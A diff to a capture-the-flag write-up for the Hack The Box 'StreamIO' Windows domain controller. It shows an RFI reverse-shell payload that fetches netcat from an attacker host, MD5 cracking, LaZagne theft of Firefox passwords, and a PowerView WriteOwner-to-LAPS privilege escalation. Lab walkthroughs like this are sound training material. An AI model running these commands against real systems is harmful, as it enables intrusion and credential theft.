@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/streamio.png
-tags: ["HTB"]
+tags: ["HTB", "domain-controller", "php", "vhosts", "feroxbuster", "sqli", "sqli-union", "waf", "hashcat", "hydra", "lfi", "rfi", "mssql", "sqlcmd", "evil-winrm", "firefox", "firepwd", "bloodhound", "bloodhound-python", "laps", "writeowner"]
 ---
 
 # StreamIO
@@ -559,8 +559,398 @@ echo(" ---- ERROR ---- ");
 - We have a `include` parameter which we can use
   - It get the contents of the file and passes it to `eval`
   - We could try `RFI`
+  - I'll try hosting file with `system('whoami');`
+    - We must have `Content-Type: application/x-www-form-urlencoded` in our request or it won't work
+
+![](./images/25.png)
+
+- Let's get reverse shell
+  - The payload
+```                                                   
+system("powershell -c wget 10.10.16.6/nc64.exe -outfile \\programdata\\nc.exe");
+system("\\programdata\\nc.exe -e powershell 10.10.16.6 6666");
+```
+
+- Now we need to set our listener and send a request
+
+![](./images/26.png)
+
+## User #1
+- Let's enumerate
+```
+PS C:\inetpub> findstr /spin "passw" *.php
+findstr /spin "passw" *.php
+streamio.htb\login.php:59:if(isset($_POST['username']) && isset($_POST['password']))
+streamio.htb\login.php:64:    $pass = md5($_POST['password']);
+streamio.htb\login.php:65:    $query = "select * from users where username = '$user' and password = '$pass'";
+streamio.htb\login.php:97:              <input type="password" class="form-control" placeholder="Password" name="password">
+streamio.htb\register.php:58:if(isset($_POST['username']) && isset($_POST['password']) && isset($_POST['confirm']))
+streamio.htb\register.php:62:  ## password match check
+streamio.htb\register.php:63:  if($_POST['password'] !== $_POST['confirm'])
+streamio.htb\register.php:67:        Passwords do not match
+streamio.htb\register.php:73:  $pass = md5($_POST['password']);
+streamio.htb\register.php:83:    $query = "insert into users(username,password,is_staff) values('$user','$pass',0)";
+streamio.htb\register.php:109:              <input type="password" class="form-control" placeholder="Choose a password" name="password">
+streamio.htb\register.php:118:              <input type="password" class="form-control" placeholder="Confirm password" name="confirm">
+PS C:\inetpub> findstr /spin "pwd" *.php
+findstr /spin "pwd" *.php
+streamio.htb\admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
+streamio.htb\login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
+streamio.htb\register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
+watch.streamio.htb\search.php:15:$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
+```
+
+- Now we can connect to `db` as `db_admin`
+  - The box has `sqlcmd`
+```
+PS C:\inetpub> where.exe sqlcmd
+where.exe sqlcmd
+C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
+```
+```
+PS C:\inetpub> sqlcmd /?
+sqlcmd /?
+Microsoft (R) SQL Server Command Line Tool
+Version 15.0.2000.5 NT
+Copyright (C) 2019 Microsoft Corporation. All rights reserved.
+
+usage: Sqlcmd            [-U login id]          [-P password]
+  [-S server]            [-H hostname]          [-E trusted connection]
+  [-N Encrypt Connection][-C Trust Server Certificate]
+  [-d use database name] [-l login timeout]     [-t query timeout]
+  [-h headers]           [-s colseparator]      [-w screen width]
+  [-a packetsize]        [-e echo input]        [-I Enable Quoted Identifiers]
+  [-c cmdend]            [-L[c] list servers[clean output]]
+  [-q "cmdline query"]   [-Q "cmdline query" and exit]
+  [-m errorlevel]        [-V severitylevel]     [-W remove trailing spaces]
+  [-u unicode output]    [-r[0|1] msgs to stderr]
+  [-i inputfile]         [-o outputfile]        [-z new password]
+  [-f <codepage> | i:<codepage>[,o:<codepage>]] [-Z new password and exit]
+  [-k[1|2] remove[replace] control characters]
+  [-y variable length type display width]
+  [-Y fixed length type display width]
+  [-p[1] print statistics[colon format]]
+  [-R use client regional setting]
+  [-K application intent]
+  [-M multisubnet failover]
+  [-b On error batch abort]
+  [-v var = "value"...]  [-A dedicated admin connection]
+  [-X[1] disable commands, startup script, environment variables [and exit]]
+  [-x disable variable substitution]
+  [-j Print raw error messages]
+  [-g enable column encryption]
+  [-G use Azure Active Directory for authentication]
+  [-? show syntax summary]
+
+```
+
+- Let's connect as `db_admin` and query from `streamio_backup` database
+```
+PS C:\inetpub> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
+sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
+table_name                                                                                                                      
+--------------------------------------------------------------------------------------------------------------------------------
+movies                                                                                                                          
+users                                                                                                                           
+
+(2 rows affected)
+```
+```
+PS C:\inetpub> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+ sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
+id          username                                           password                                          
+----------- -------------------------------------------------- --------------------------------------------------
+          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
+          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
+          3 James                                              c660060492d9edcaa8332d89c99c9239                  
+          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
+          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
+          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
+          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
+          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
+
+(8 rows affected)
+```
+
+- Now we try cracking again
+```
+└─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user       
+hashcat (v6.2.6) starting
+...
+389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com 
+Approaching final keyspace - workload adjusted.           
+...
+```
+```
+└─$ hashcat -m 0 user-hash.list /usr/share/wordlists/rockyou.txt --user --show
+nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
+yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
+Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
+Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
+```
+
+- Now let's check if creds for `nikk37` are valid
+```
+└─$ crackmapexec smb 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com'                      
+SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.158    445    DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com
+```
+
+- And we can `winrm`
+```
+└─$ crackmapexec winrm 10.10.11.158 -u 'nikk37' -p 'get_dem_girls2@yahoo.com' 
+SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)
+HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman
+WINRM       10.10.11.158    5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
+```
+
+![](./images/27.png)
+
+## User #2
+- The box has `Firefox` installed
+```
+*Evil-WinRM* PS C:\> ls "Program Files (x86)"
 
 
-## User
+    Directory: C:\Program Files (x86)
 
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        9/15/2018  12:28 AM                Common Files
+d-----        2/25/2022  11:35 PM                IIS
+d-----        2/25/2022  11:38 PM                iis express
+d-----        3/28/2022   4:46 PM                Internet Explorer
+d-----        2/22/2022   1:54 AM                Microsoft SQL Server
+d-----        2/22/2022   1:53 AM                Microsoft.NET
+d-----        5/26/2022   4:09 PM                Mozilla Firefox
+d-----        5/26/2022   4:09 PM                Mozilla Maintenance Service
+d-----        2/25/2022  11:33 PM                PHP
+d-----        2/22/2022   2:56 AM                Reference Assemblies
+d-----        3/28/2022   4:46 PM                Windows Defender
+d-----        3/28/2022   4:46 PM                Windows Mail
+d-----        3/28/2022   4:46 PM                Windows Media Player
+d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
+d-----        9/15/2018  12:28 AM                windows nt
+d-----        3/28/2022   4:46 PM                Windows Photo Viewer
+d-----        9/15/2018  12:19 AM                Windows Portable Devices
+d-----        9/15/2018  12:19 AM                WindowsPowerShell
+
+```
+
+- And `nikk37` has 2 profiles
+```
+*Evil-WinRM* PS C:\> ls C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles
+
+
+    Directory: C:\Users\nikk37\AppData\roaming\mozilla\Firefox\Profiles
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/22/2022   2:40 AM                5rwivk2l.default
+d-----        2/22/2022   2:42 AM                br53rxeg.default-release
+
+```
+
+- Let's check them
+  - We can download `key4.db` and `logins.json` files and use [Firepwd](https://github.com/lclevy/firepwd) to extract
+  - Or use [LaZagne](https://github.com/AlessandroZ/LaZagne)
+```
+*Evil-WinRM* PS C:\users\nikk37> wget 10.10.16.6/LaZagne.exe -outfile lz.exe
+*Evil-WinRM* PS C:\users\nikk37> .\lz.exe all
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+
+########## User: nikk37 ##########
+
+------------------- Firefox passwords -----------------
+
+[+] Password found !!!
+URL: https://slack.streamio.htb
+Login: JDgodd
+Password: password@12
+
+[+] Password found !!!
+URL: https://slack.streamio.htb
+Login: yoshihide
+Password: paddpadd@12
+
+[+] Password found !!!
+URL: https://slack.streamio.htb
+Login: admin
+Password: JDg0dd1s@d0p3cr3@t0r
+
+[+] Password found !!!
+URL: https://slack.streamio.htb
+Login: nikk37
+Password: n1kk1sd0p3t00:)
+
+
+[+] 4 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 0.14062094688415527
+```
+
+- Let's check creds 
+  - We know the passwords for `nikk37` and `yoshihide`
+  - So we check the creds for `admin` and `JDgodd`
+```
+└─$ crackmapexec smb 10.10.11.158 -u user.list -p pass.list --continue-on-success               
+SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE 
+SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
+SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
+```
+
+- Now we have another user
+  - `JDgodd:JDg0dd1s@d0p3cr3@t0r`
+  - But we can't `winrm`, since he doesn't have privileges
+```
+*Evil-WinRM* PS C:\users\nikk37> net user JDgodd
+User name                    JDgodd
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/22/2022 2:56:42 AM
+Password expires             Never
+Password changeable          2/23/2022 2:56:42 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   9/20/2023 5:24:58 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users
+The command completed successfully.
+```
 ## Root
+- Let's enumerate the domain using `bloodhound`
+```
+└─$ bloodhound-python -c all -u 'JDgodd' -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb -dc streamio.htb -ns 10.10.11.158 --zip
+INFO: Found AD domain: streamio.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Connecting to LDAP server: streamio.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: streamio.htb
+INFO: Found 8 users
+INFO: Found 54 groups
+INFO: Found 4 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.streamIO.htb
+INFO: Done in 00M 24S
+INFO: Compressing output into 20230920182850_bloodhound.zip
+
+```
+
+- We have `WriteOwner` over `Core Staff` which can read `LAPS` password of `DC`
+
+![](./images/28.png)
+
+- Let's upload `powerview` and perform our attack
+  - https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner
+  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#writeowner-on-group
+```
+*Evil-WinRM* PS C:\users\nikk37> wget 10.10.16.6/powerview.ps1 -outfile powerview.ps1
+*Evil-WinRM* PS C:\users\nikk37> . .\powerview.ps1
+*Evil-WinRM* PS C:\users\nikk37> $password = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
+*Evil-WinRM* PS C:\users\nikk37> $creds = New-Object System.Management.Automation.PSCredential('JDgodd', $password)
+*Evil-WinRM* PS C:\users\nikk37> Set-DomainObjectOwner -Identity 'Core Staff' -OwnerIdentity 'JDgodd' -Credential $creds
+*Evil-WinRM* PS C:\users\nikk37> Add-DomainObjectAcl -Credential $creds -TargetIdentity 'Core Staff' -PrincipalIdentity 'JDgodd'
+*Evil-WinRM* PS C:\users\nikk37> Add-DomainGroupMember -Credential $creds -Identity 'Core Staff' -Members 'JDgodd'
+*Evil-WinRM* PS C:\users\nikk37> net user jdgodd
+User name                    JDgodd
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/22/2022 2:56:42 AM
+Password expires             Never
+Password changeable          2/23/2022 2:56:42 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   9/20/2023 5:41:37 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *CORE STAFF
+The command completed successfully.
+
+*Evil-WinRM* PS C:\users\nikk37> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $creds
+
+
+DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
+DNSHostName       : DC.streamIO.htb
+Enabled           : True
+ms-Mcs-AdmPwd     : 9-{dc@T0rG5lp1
+Name              : DC
+ObjectClass       : computer
+ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
+SamAccountName    : DC$
+SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
+UserPrincipalName :
+
+```
+
+- Now we can `wirnm` as `administrator`
+
+![](./images/29.png)
+
+- The flag is located in `Martin`'s desktop
+```
+*Evil-WinRM* PS C:\users> gci -include root.txt -recurse -path .
+
+
+    Directory: C:\users\Martin\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        9/20/2023   4:46 PM             34 root.txt
+
+```
+
+- Apparently we could also retrieve `LAPS` password via `crackmapexec`
+```
+└─$ crackmapexec smb 10.10.11.158 -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' --laps --ntds
+SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.158    445    DC               [-] DC\administrator:9-{dc@T0rG5lp1 STATUS_LOGON_FAILURE 
+```
